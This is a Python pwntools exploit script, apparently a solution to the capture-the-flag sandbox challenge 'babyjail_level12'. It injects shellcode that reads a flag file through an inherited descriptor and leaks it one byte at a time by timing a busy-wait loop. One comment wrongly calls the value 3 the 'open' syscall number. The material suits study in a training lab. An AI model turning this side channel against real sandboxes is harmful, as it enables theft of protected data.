# Nagib Lakhdari 3si2
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# This exploit was generated via
# 1) pwntools
# 2) ctfmate

import time
import pwn

BINARY = "/challenge/babyjail_level12"
LIBC = "/usr/lib/x86_64-linux-gnu/libc.so.6"
LD = "/lib64/ld-linux-x86-64.so.2"

exe = pwn.context.binary = pwn.ELF(BINARY)
libc = pwn.ELF(LIBC)
ld = pwn.ELF(LD)
pwn.context.terminal = ["tmux", "splitw", "-h"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
p64 = pwn.p64
u64 = pwn.u64
p32 = pwn.p32
u32 = pwn.u32
p16 = pwn.p16
u16 = pwn.u16
p8 = pwn.p8
u8 = pwn.u8

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)

def local(argv=[], *a, **kw):
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

assembly = """
xor rax, rax
push 3  ; Syscall number for 'open'
pop rdi
lea rsi, [rip + flag_content]
push 60  ; Number of bytes to read
pop rdx
syscall  ; Read the content of the flag file into memory

xor rbx, rbx
mov bl, byte ptr[rip + flag_content + {index}]  ; Get the byte at the specified index
cmp bl, {byte}  ; Compare to the byte value
je loop_start ; If equal, go to loop_start
jmp do_nop  ; Otherwise, go to do_nop

loop_start:
mov rcx, 3500000000  ; Initialize a counter for the loop
loop_flag:
cmp rcx, 0  ; Check if the counter is 0
je do_nop  ; If yes, go to 'do_nop'
dec rcx  ; Decrement the counter
jmp loop_flag  ; Repeat the loop

do_nop:
nop

flag_content:
.rept 60  ; Repeat the directive 60 times
.byte 0 
.endr  ; End of the repetition block
"""

print('My shellcode:')
print(assembly)

def do_run(i, b):
    with pwn.process(argv=[BINARY, '/flag'], close_fds=False) as p:
        t1 = time.time()  # Measure the execution time first time
        p.send(pwn.asm(assembly.format(index=i, byte=b)))  # Send the assembly code to the process
        p.poll(True)  # Wait for the process to finish
        t2 = time.time()  # Measure the execution time second time

    interval = t2 - t1  # Calculate the time interval
    print(f'TIME INTERVAL: {interval:.6f}, index: {i}, byte: {b}')
    return interval > 0.8  # If the interval is greater than 0.8, it means the byte is correct

def exploit():
    flag = ''
    for i in range(len(flag), 55):  # Loop to find each byte of the flag up to a length of 55
        for b in range(0x20, 0x7f):  # Iterate through all printable ASCII characters
            try:
                if do_run(i, b):  # Attempt to find the correct byte
                    print(f'flag[{i}] is {b}')
                    flag += chr(b)
                    print(f'Flag so far: {flag}')
                    break
            except Exception as e:
                print(f'Got exception: {e}')
                time.sleep(1)  # Retry after a short pause in case of exception
                if do_run(i, b):
                    flag += chr(b)
                    print(f'Flag so far: {flag}')
                    break
    print(f'Final flag: {flag}')  # Print the final flag

if __name__ == "__main__":
    exploit()
